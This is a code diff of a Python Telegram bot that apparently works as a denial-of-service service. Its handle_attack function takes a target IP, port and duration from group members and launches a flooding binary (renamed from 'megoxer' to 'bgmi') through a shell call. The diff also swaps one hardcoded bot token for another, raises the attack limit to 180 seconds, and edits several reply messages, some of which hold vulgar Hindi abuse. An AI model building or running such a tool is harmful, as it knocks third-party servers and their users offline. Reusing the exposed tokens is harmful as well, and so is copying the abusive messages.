@@ -12,7 +12,7 @@ import os
 import sys
 import socket
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('8093334212:AAGU0hVVY6s11Q2og61G3fOIbQR0v6mU4kE')
+bot = telebot.TeleBot('8173728765:AAHSfT8lLDvKVTp3r-IwcVhHzdolWzblU74')
 
 
 # Admin user IDs
@@ -101,15 +101,15 @@ def handle_attack(message):
     command = message.text.split()
 
     if message.chat.id != int(GROUP_ID):
-        bot.reply_to(message, f"🚫 KIYA BE LAUDE MA CHUDA NE AYA HAI ❌\n🔗 GROUP 𝐉𝐨𝐢𝐧 KAR: {CHANNEL_USERNAME}")
+        bot.reply_to(message, f"🚫 𝐘𝐄 𝐁𝐎𝐓 𝐒𝐈𝐑𝐅 𝐆𝐑𝐎𝐔𝐏 𝐌𝐄 𝐂𝐇𝐀𝐋𝐄𝐆𝐀  ❌\n🔗 GROUP 𝐉𝐨𝐢𝐧 KAR: {CHANNEL_USERNAME}")
         return
 
     if not is_user_in_channel(user_id):
-        bot.reply_to(message, f"❗ **SIR JI YE BOT SIRF MADAR CHOD USE KAR SAKTE HAI AAP NHI** {CHANNEL_USERNAME} 🔥")
+        bot.reply_to(message, f"❗ **𝐏𝐀𝐇𝐋𝐄 𝐉𝐎𝐈𝐍 𝐊𝐑𝐎** {CHANNEL_USERNAME} 🔥")
         return
 
     if pending_feedback.get(user_id, False):
-        bot.reply_to(message, "😡 **BHEN KE LAUDE!** 🔥\n🚀 *FEEDBACK TERA BAAP DEGA JAB TAK FEEDBACK NHI DEGA TERI MA NHI CHUDEGI!*")
+        bot.reply_to(message, "😡 **𝐒𝐂𝐑𝐄𝐄𝐍𝐒𝐇𝐎𝐓 𝐃𝐄 𝐏𝐀𝐇𝐋𝐄!** 🔥\n🚀 *𝐀𝐆𝐋𝐀 𝐀𝐓𝐓𝐀𝐂𝐊 𝐋𝐆𝐀𝐍𝐄 𝐊𝐄 𝐋𝐈𝐞 𝐒𝐀𝐁𝐈𝐓 𝐊𝐑𝐎 𝐊𝐈 𝐏𝐈𝐂 𝐃𝐀𝐋𝐈!*")
         return
 
     # Check if an attack is already running
@@ -138,8 +138,8 @@ def handle_attack(message):
         bot.reply_to(message, "❌ **𝐄𝐑𝐑𝐎𝐑:** 𝐏𝐎𝐑𝐓 𝐀𝐍𝐃 𝐓𝐈𝐌𝐄 𝐌𝐔𝐒𝐓 𝐁𝐄 𝐈𝐍𝐓𝐄𝐆𝐄𝐑𝐒!")
         return
 
-    if time_duration > 120:
-        bot.reply_to(message, "🚫 **120 SECOND KARNA HAI KAR NHI TO MA CHUDA!**")
+    if time_duration > 180:
+        bot.reply_to(message, "🚫 **180 SECOND KARNA HAI KAR NHI TO MA CHUDA!**")
         return
 
     # Get the user's profile picture
@@ -165,7 +165,7 @@ def handle_attack(message):
 
     pending_feedback[user_id] = True  
 
-    full_command = f"./megoxer {target} {port} {time_duration} 900"
+    full_command = f"./bgmi {target} {port} {time_duration} 900"
 
     try:
         subprocess.run(full_command, shell=True, check=True)
